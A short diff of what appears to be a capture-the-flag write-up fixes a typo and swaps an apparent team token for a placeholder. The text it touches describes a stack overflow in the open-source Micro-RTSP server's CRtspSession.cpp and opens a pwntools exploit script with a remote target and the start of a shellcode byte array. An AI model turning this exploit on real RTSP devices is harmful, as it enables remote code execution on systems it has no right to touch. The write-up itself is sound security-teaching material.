@@ -223,7 +223,7 @@ int main(){
 ### The Rise of Sky
 
 Strange arch(c-sky) pwn.
-Stack overlow at https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65 No PIE, No NX, ret to data
+Stack overflow at https://github.com/geeksville/Micro-RTSP/blob/master/src/CRtspSession.cpp#L65 No PIE, No NX, ret to data
 
 ```python
 from pwn import *
@@ -236,7 +236,7 @@ if debug:
     p = remote('192.168.101.23', 8554)
 else:
     p = remote('47.242.246.203', 32042)
-#    p.sendlineafter(':', 'jFtAt3QdTzm8W1qjMz+Oaw==')
+#    p.sendlineafter(':', '{Team_token}')
 
 sc = [
     0x23, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x82, 0xB8, 0x3B, 0x6E, 0x25, 0x16,
